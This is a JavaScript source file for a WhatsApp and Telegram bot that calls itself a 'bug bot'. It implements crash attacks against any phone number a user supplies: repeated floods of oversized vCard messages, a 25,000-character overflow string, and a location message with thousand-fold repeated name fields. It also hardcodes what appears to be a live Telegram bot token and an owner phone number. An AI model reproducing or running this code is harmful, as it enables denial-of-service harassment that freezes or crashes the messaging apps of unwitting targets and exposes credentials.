const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateWAMessage
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8246779983:AAEDuC8a7QMd2OwNvLDJvDGGwLkFk5nc9k8';
const ownerNumber = "94770475809";
const prefix = ".";

// Telegram Bot Initialization
const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-Hybrid", "Chrome", "20.0.04"]
    });

    // --- [ OWNER PAIRING SYSTEM ] ---
    if (!sock.authState.creds.registered) {
        console.log(`⏳ ${ownerNumber} සඳහා Pairing Code එක සකසමින් පවතී...`);
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(ownerNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(`\n🔥 WHATSAPP PAIRING CODE: ${code}\n`);
                tgBot.sendMessage(ownerNumber, `🚀 Nexus-MD WhatsApp Pairing Code: ${code}`); 
            } catch (err) {
                console.log("Pairing Error: ", err.message);
            }
        }, 8000);
    }

    sock.ev.on('creds.update', saveCreds);

    // --- [ WHATSAPP MAIN LOGIC ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        
        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (isGroup) return; // Private මැසේජ් වල විතරයි වැඩ කරන්නේ
        if (!body.startsWith(prefix)) return;

        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');

        // --- [ COMMANDS MENU ] ---
        if (command === 'menu' || command === 'help') {
            const menu = `⚡ *NEXUS-MD BUG BOT V3.1* ⚡\n\n` +
                         `🛡️ *PUBLIC PAIRING* \n` +
                         `◈ ${prefix}bot [number] - Get Pairing Code\n\n` +
                         `💀 *BUG ATTACKS* \n` +
                         `◈ ${prefix}vbug [number] - Vcard Crash\n` +
                         `◈ ${prefix}cbug [number] - Character Overflow\n` +
                         `◈ ${prefix}lbug [number] - Location Freeze\n` +
                         `◈ ${prefix}abug [number] - Audio Crash\n` +
                         `◈ ${prefix}pbug [number] - Poll Crash\n\n` +
                         `🛠️ *SYSTEM* \n` +
                         `◈ ${prefix}ping - Speed Test\n` +
                         `◈ ${prefix}status - Bot Status\n\n` +
                         `🚀 *Owner:* Sasiya MD\n` +
                         `🛡️ *Hybrid:* WhatsApp + Telegram`;

            await sock.sendMessage(from, { 
                text: menu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS BUG SYSTEM",
                        body: "World Class Exploit Active",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1
                    }
                }
            });
        }

        // --- [ PUBLIC PAIRING ] ---
        if (command === 'bot') {
            let target = q.replace(/[^0-9]/g, '');
            if (!target) return sock.sendMessage(from, { text: "❌ නම්බර් එකත් එක්ක ගහපන් මචං!" });
            
            await sock.sendMessage(from, { text: "⏳ පෝලිමේ ඉන්න... ඔයාගේ කෝඩ් එක හදනවා." });
            const { state: tState } = await useMultiFileAuthState(`temp_${target}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }) });

            setTimeout(async () => {
                try {
                    let code = await tSock.requestPairingCode(target);
                    await sock.sendMessage(from, { text: `🔥 *YOUR PAIRING CODE:* ${code}` });
                } catch (e) {
                    await sock.sendMessage(from, { text: "❌ Error! ආයෙ ට්‍රයි කරන්න." });
                }
            }, 5000);
        }

        // --- [ BUG 1: VCARD CRASH ] ---
        if (command === 'vbug') {
            let target = q ? q.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(200);
            await sock.sendMessage(from, { text: "💀 Vcard Attack Started..." });
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
            }
            sock.sendMessage(from, { text: "✅ Done!" });
        }

        // --- [ BUG 2: CHARACTER OVERFLOW ] ---
        if (command === 'cbug') {
            let target = q ? q.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const payload = "҈".repeat(20000) + "⚰️".repeat(5000);
            await sock.sendMessage(from, { text: "🚀 Character Attack Sent!" });
            for (let i = 0; i < 5; i++) {
                await sock.sendMessage(target, { text: payload });
            }
        }

        // --- [ BUG 3: LOCATION CRASH ] ---
        if (command === 'lbug') {
            let target = q ? q.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            await sock.sendMessage(target, { 
                location: { degreesLatitude: -23.5333, degreesLongitude: -46.6167 },
                name: "NEXUS CRASH".repeat(1000),
                address: "⚰️".repeat(1000)
            });
            sock.sendMessage(from, { text: "✅ Location Bug Sent!" });
        }

        if (command === 'ping') {
            const start = Date.now();
            await sock.sendMessage(from, { text: "🚀" });
            const end = Date.now();
            sock.sendMessage(from, { text: `🔥 Speed: ${end - start}ms` });
        }
    });

    // --- [ TELEGRAM COMMANDS ] ---
    tgBot.onText(/\/menu/, (msg) => {
        const chatId = msg.chat.id;
        tgBot.sendMessage(chatId, "🤖 *Nexus-MD Telegram Menu*\n\n/status - Check Connection\n/pair - Get Manual Pairing", { parse_mode: "Markdown" });
    });

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') console.log('✅ Nexus Hybrid Online!');
        if (connection === 'close') {
            let reason = lastDisconnect.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) startNexus();
        }
    });
}

startNexus();
